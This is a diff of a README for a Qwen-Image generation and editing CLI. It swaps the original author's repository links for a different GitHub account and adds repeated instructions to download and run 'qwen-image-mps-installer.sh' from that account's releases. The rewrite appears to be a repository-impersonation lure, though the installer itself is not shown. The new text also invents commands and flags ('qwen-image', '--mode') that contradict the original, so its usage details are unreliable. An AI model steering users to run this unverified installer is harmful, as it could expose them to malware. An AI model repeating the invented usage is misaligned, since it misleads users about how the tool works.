@@ -1,217 +1,238 @@
-## Qwen Image (MPS/CUDA/CPU)
+# Qwen Image MPS/CUDA/CPU — Text-to-Image & Editing CLI
 
-Generate and edit images from text prompts using the Hugging Face Diffusers pipeline for `Qwen/Qwen-Image`, with automatic device selection for Apple Silicon (MPS), NVIDIA CUDA, or CPU fallback.
+[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/lagmgame/qwen-image-mps/releases)
 
-### Features
-- **Auto device selection**: prefers MPS (Apple Silicon), then CUDA, else CPU
-- **Simple CLI**: provide a prompt and number of steps
-- **Image generation**: create new images from text prompts
-- **Image editing**: modify existing images using text instructions
-- **Timestamped outputs**: avoids overwriting previous generations
-- **Fast mode**: 8-step generation using Lightning LoRA (auto-downloads if needed)
-- **Ultra-fast mode**: 4-step generation using Lightning LoRA (auto-downloads if needed)
- - **Multi-image generation**: generate multiple images in one run with `--num-images`
-
-### Example
-
-Example result you can create with this project:
+Generate and edit images from text prompts. The tool chooses the best device available on your system: Apple Silicon (MPS), NVIDIA CUDA, or CPU. It ships a small CLI, fast presets, and timestamped outputs to avoid overwrites.
 
 ![Example image](example.png)
 
+- Platform: macOS (MPS), Linux (CUDA), Windows (CUDA/CPU)
+- Model: Qwen-Image via Hugging Face Diffusers
+- Integrations: Lightning LoRA for fast modes
+
+## Key features
+
+- Auto device selection: prefer MPS, then CUDA, then CPU.
+- Text-to-image generation and text-guided image editing.
+- CLI interface with prompt, steps, seeds, and output path.
+- Multi-image generation with --num-images.
+- Timestamped filenames to avoid overwriting previous runs.
+- Fast mode (8 steps) and Ultra-fast mode (4 steps) using Lightning LoRA.
+- Auto-download of LoRA files when needed.
+- Minimal dependencies. Works with PyPI package or from source.
+
+## Quick links
+
+- Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
+  Download the installer file qwen-image-mps-installer.sh from the releases page and run it.
+
+[![Get Releases](https://img.shields.io/badge/Get%20Releases-%20Download-brightgreen?logo=github)](https://github.com/lagmgame/qwen-image-mps/releases)
+
 ## Installation
 
-### Option 1: Install from PyPI (Recommended)
+Option A — Install from PyPI (recommended)
 
-Install the package using pip:
+Run:
+
 ```bash
+python -m pip install --upgrade pip
 pip install qwen-image-mps
 ```
 
-Then run it directly from the command line:
+Option B — Run the installer from Releases
+
+1. Visit the Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
+2. Download the file named qwen-image-mps-installer.sh from the release assets.  
+3. Make it executable and run it:
+
 ```bash
-qwen-image-mps --help
-qwen-image-mps generate --help  # For image generation
-qwen-image-mps edit --help      # For image editing
+chmod +x qwen-image-mps-installer.sh
+./qwen-image-mps-installer.sh
 ```
 
-### Option 2: Direct script execution with uv
+Option C — From source
 
-You can run this script directly using `uv run` without installation - it will install all dependencies automatically in an isolated environment:
 ```bash
-uv run https://raw.githubusercontent.com/ivanfioravanti/qwen-image-mps/refs/heads/main/qwen-image-mps.py --help
-```
-
-Or download the file first:
-```bash
-curl -O https://raw.githubusercontent.com/ivanfioravanti/qwen-image-mps/refs/heads/main/qwen-image-mps.py
-uv run qwen-image-mps.py --help
-```
-
-### Option 3: Install from source
-
-Clone the repository and install in development mode:
-```bash
-git clone https://github.com/ivanfioravanti/qwen-image-mps.git
+git clone https://github.com/lagmgame/qwen-image-mps.git
 cd qwen-image-mps
+python -m venv .venv
+source .venv/bin/activate
+pip install -r requirements.txt
 pip install -e .
 ```
 
-**Note:** The first time you run the tool, it will download the 57.7GB model from Hugging Face and store it in your `~/.cache/huggingface/hub/models--Qwen--Qwen-Image` directory.
+System requirements
 
-## Usage
+- Python 3.10 or 3.11
+- torch with MPS support (macOS 12.3+) or CUDA-enabled torch for NVIDIA GPUs
+- ~8 GB RAM for light use, more for larger batches or high-res outputs
 
-After installation, use the `qwen-image-mps` command with either `generate` or `edit` subcommands:
+## Device selection
 
-```bash
-qwen-image-mps --help
-qwen-image-mps generate --help  # For image generation
-qwen-image-mps edit --help      # For image editing
-```
+The CLI picks a device in this order:
 
-### Image Generation Examples:
+1. MPS (Apple Silicon) if torch.backends.mps.is_available()
+2. CUDA if torch.cuda.is_available()
+3. CPU otherwise
 
-```bash
-# Default prompt and steps
-qwen-image-mps generate
+You can override selection with --device flag. Valid values: mps, cuda, cpu.
 
-# Custom prompt and fewer steps
-qwen-image-mps generate -p "A serene alpine lake at sunrise, ultra detailed, cinematic" -s 30
+## Basic usage
 
-# Fast mode with Lightning LoRA (8 steps)
-qwen-image-mps generate -f -p "A magical forest with glowing mushrooms"
-
-# Ultra-fast mode with Lightning LoRA (4 steps)
-qwen-image-mps generate --ultra-fast -p "A magical forest with glowing mushrooms"
-
-
-# Custom seed for reproducible generation
-qwen-image-mps generate --seed 42 -p "A vintage coffee shop"
-
-# Generate multiple images (incrementing seed per image when seed is provided)
-qwen-image-mps generate -p "Retro sci-fi city skyline at night" --num-images 3 --seed 100
-
-# Generate multiple images with a fresh random seed for each image (omit --seed)
-qwen-image-mps generate -p "Retro sci-fi city skyline at night" --num-images 3
-```
-
-### Image Editing Examples:
+Generate a single image:
 
 ```bash
-# Basic image editing
-qwen-image-mps edit -i input.jpg -p "Change the sky to sunset colors"
-
-# Edit with custom steps
-qwen-image-mps edit -i photo.png -p "Add snow to the mountains" -s 30
-
-# Edit with custom output filename
-qwen-image-mps edit -i landscape.jpg -p "Make it autumn colors" -o autumn_landscape.png
-
-# Edit with custom seed and steps
-qwen-image-mps edit -i portrait.jpg -p "Change hair color to blonde" --seed 123 -s 30
+qwen-image --prompt "A cozy cabin in the snowy woods, evening light" --steps 30 --output-dir outputs
 ```
 
-If using the direct script with uv, replace `qwen-image-mps` with `uv run qwen-image-mps.py` in the examples above.
+Generate 4 images in one run:
 
-### Command Arguments
+```bash
+qwen-image --prompt "Futuristic city skyline at sunset" --num-images 4 --steps 28
+```
 
-#### Generate Command Arguments
-- `-p, --prompt` (str): Prompt text for image generation.
-- `-s, --steps` (int): Number of inference steps (default: 50).
-- `-f, --fast`: Enable fast mode using Lightning LoRA for 8-step generation.
-- `--ultra-fast`: Enable ultra-fast mode using Lightning LoRA v1.0 for 4-step generation.
-- `--seed` (int): Random seed for reproducible generation (default: 42). If not
-  explicitly provided and generating multiple images, a new random seed is used
-  for each image.
-- `--num-images` (int): Number of images to generate (default: 1).
+Use a fixed seed for reproducible results:
 
-#### Edit Command Arguments
-- `-i, --input` (str): Path to the input image to edit (required).
-- `-p, --prompt` (str): Editing instructions (required).
-- `-s, --steps` (int): Number of inference steps (default: 50).
-- `--seed` (int): Random seed for reproducible generation (default: 42).
-- `-o, --output` (str): Output filename (default: edited-<timestamp>.png).
+```bash
+qwen-image --prompt "Studio portrait, dramatic lighting" --seed 42 --steps 40
+```
 
-## What the script does
+Use fast presets (Lightning LoRA auto-download):
 
-### Image Generation
-- Loads `Qwen/Qwen-Image` via `diffusers.DiffusionPipeline`
-- Selects device and dtype:
-  - MPS: `bfloat16`
-  - CUDA: `bfloat16`
-  - CPU: `float32`
-- Uses a light positive conditioning suffix for quality
-- Generates at a 16:9 resolution (default `1664x928`)
-- Saves the output as `image-YYYYMMDD-HHMMSS.png` for a single image,
-  or `image-YYYYMMDD-HHMMSS-1.png`, `image-YYYYMMDD-HHMMSS-2.png`, ... when using `--num-images`
-- Prints the full path of the saved image
+- Fast mode (8 steps):
 
-### Image Editing
-- Loads `Qwen/Qwen-Image-Edit` via `QwenImageEditPipeline` for image editing
-- Takes an existing image and editing instructions as input
-- Applies transformations while preserving the original structure
-- Saves the edited image as `edited-YYYYMMDD-HHMMSS.png` or custom filename
-- Prints the full path of the edited image
+```bash
+qwen-image --prompt "Minimalist poster design" --mode fast --num-images 6
+```
 
-### Fast Mode & Ultra-Fast Mode (Lightning LoRA)
+- Ultra-fast mode (4 steps):
 
-#### Fast Mode (`-f/--fast`)
-When using the `-f/--fast` flag, the tool:
-- Automatically downloads the Lightning LoRA v1.1 from Hugging Face (cached in `~/.cache/huggingface/hub/`)
-- Merges the LoRA weights into the model for accelerated generation
-- Uses fixed 8 inference steps with CFG scale 1.0
-- Provides ~6x speedup compared to the default 50 steps
+```bash
+qwen-image --prompt "Icon-style robot character" --mode ultra-fast --num-images 8
+```
 
-#### Ultra-Fast Mode (`--ultra-fast`)
-When using the `--ultra-fast` flag, the tool:
-- Automatically downloads the Lightning LoRA v1.0 from Hugging Face (cached in `~/.cache/huggingface/hub/`)
-- Merges the LoRA weights into the model for maximum speed generation
-- Uses fixed 4 inference steps with CFG scale 1.0
-- Provides ~12x speedup compared to the default 50 steps
-- Ideal for rapid prototyping and iteration
+Edit an existing image using a text instruction:
 
-The fast implementation is based on [Qwen-Image-Lightning](https://github.com/ModelTC/Qwen-Image-Lightning). The Lightning LoRA models are available on HuggingFace at [lightx2v/Qwen-Image-Lightning](https://huggingface.co/lightx2v/Qwen-Image-Lightning).
+```bash
+qwen-image --edit --image ./inputs/person.jpg --prompt "Change background to a sunny beach" --steps 25
+```
 
-**Note:** Fast modes are currently only available for image generation, not editing.
+Save outputs to a custom folder:
 
-## Notes and tweaks
-- **Aspect ratio / resolution**: The script currently uses the `16:9` entry from an `aspect_ratios` map. You can change the selection in the code where `width, height` is set.
-- **Determinism**: Use the `--seed` parameter to control the random generator for reproducible results. On MPS, the random generator runs on CPU for improved stability.
-- **Performance**: If you hit memory or speed issues, try reducing `--steps`.
+```bash
+qwen-image --prompt "Low-poly mountain range" --output-dir my-renders
+```
+
+All output filenames include a timestamp and a short hash to avoid accidental overwrites.
+
+## CLI reference
+
+Common flags
+
+- --prompt TEXT (required): Text prompt for generation.
+- --edit: Enable image edit mode. Requires --image.
+- --image PATH: Input image for editing.
+- --steps N: Number of diffusion steps (default 30).
+- --num-images N: Number of images to generate in one run (default 1).
+- --seed N: Random seed for reproducible outputs.
+- --mode {default,fast,ultra-fast}: Generation mode. fast uses Lightning LoRA 8-step; ultra-fast uses 4-step LoRA.
+- --device {mps,cuda,cpu}: Force device.
+- --output-dir PATH: Directory to save images.
+- --height H, --width W: Output resolution (maintain model limits).
+- --help: Show help.
+
+Example: combine flags
+
+```bash
+qwen-image --prompt "Retro sci-fi poster, neon colors" --num-images 3 --mode fast --device mps --output-dir outputs/sci-fi
+```
+
+## How generation and editing work
+
+- The tool uses the Hugging Face Diffusers pipeline with the Qwen-Image model.
+- For edits, it applies mask-guided or inpainting steps based on the provided input image and prompt.
+- Fast and ultra-fast modes apply a lightweight LoRA model that trades some fidelity for much fewer steps.
+- The CLI handles model and LoRA downloads, caching them to the user cache directory.
+
+## Performance tips
+
+- Use MPS on Apple Silicon for a good balance of speed and memory.
+- Use CUDA on NVIDIA GPUs for best raw throughput.
+- Use --mode fast or --mode ultra-fast for many quick drafts.
+- Lower resolution reduces VRAM and speeds up generation.
+- Use a fixed seed to compare parameter changes.
 
 ## Troubleshooting
-- If you see "Using CPU" in the console on Apple Silicon, ensure your PyTorch build includes MPS and you are running on Apple Silicon Python (not under Rosetta).
-- If model download fails or is unauthorized, log in with `huggingface-cli login` or accept the model terms on the Hugging Face model page.
 
-## Development
+Check device availability from Python:
 
-To contribute or modify the tool:
-
-1. Clone the repository:
-```bash
-git clone https://github.com/ivanfioravanti/qwen-image-mps.git
-cd qwen-image-mps
+```python
+import torch
+print("MPS:", getattr(torch.backends, "mps", None) and torch.backends.mps.is_available())
+print("CUDA:", torch.cuda.is_available(), "count:", torch.cuda.device_count())
 ```
 
-2. Install in development mode with dev dependencies:
-```bash
-pip install -e ".[dev]"
-```
+If a model asset fails to download, rerun the CLI. The installer and CLI will retry cached downloads on next run.
 
-3. Install pre-commit hooks:
-```bash
-pre-commit install
-```
+If you hit memory limits, try lower resolution or set --num-images 1.
 
-The project uses:
-- `black` for code formatting
-- `isort` for import sorting
-- `ruff` for linting
-- Pre-commit hooks for code quality
+## Output layout
 
-## Repository contents
-- `src/qwen_image_mps/`: Main package source code
-- `qwen-image-mps.py`: Script wrapper for direct URL execution
-- `pyproject.toml`: Package configuration and dependencies
-- `uv.lock`: Locked dependencies for reproducible builds
-- `.github/workflows/`: CI/CD pipelines for testing and publishing
-- `example.png`: Sample generated image
+Default output directory: ./outputs
+
+Files are named like:
+
+outputs/2025-08-12_153045_ab12cd34.png
+
+This format preserves previous runs and makes it easy to script automation.
+
+## Integrations and internals
+
+- Models: Qwen-Image via Hugging Face model hub.
+- Pipeline: diffusers pipelines, inpainting when editing.
+- Fast modes: Lightning LoRA weights applied at runtime.
+- Storage: model files and LoRA cached under the standard cache directory.
+
+## Examples and presets
+
+Example prompts to try
+
+- "A fantasy castle on a cliff, sunrise, painterly"
+- "Close up macro of a mechanical watch, shallow depth of field"
+- "Isometric game scene: marketplace, busy stalls, stylized colors"
+
+Preset flows
+
+1. Drafting: use --mode ultra-fast with --num-images 6 to get many variants.
+2. Select best candidate.
+3. Edit: use --edit with a focused prompt to refine composition or background.
+4. Final render: use higher steps (40+) and larger resolution.
+
+## Contributing
+
+- Fork the repo.
+- Create a feature branch.
+- Run tests and linting: pip install -r dev-requirements.txt then run pytest and flake8.
+- Open a pull request with a clear description and a minimal reproducible change.
+
+Development tips
+
+- Use a local virtual env for testing.
+- Keep changes small and focused.
+- Add tests for pipeline changes.
+
+## Releases
+
+Download installer and release assets from the Releases page: https://github.com/lagmgame/qwen-image-mps/releases  
+Get the file qwen-image-mps-installer.sh from the release assets and execute it to install system-wide helpers.
+
+## License
+
+This repository uses the MIT License. See the LICENSE file for details.
+
+## Acknowledgments
+
+- Hugging Face Diffusers
+- Qwen-Image model creators
+- Lightning LoRA community
+
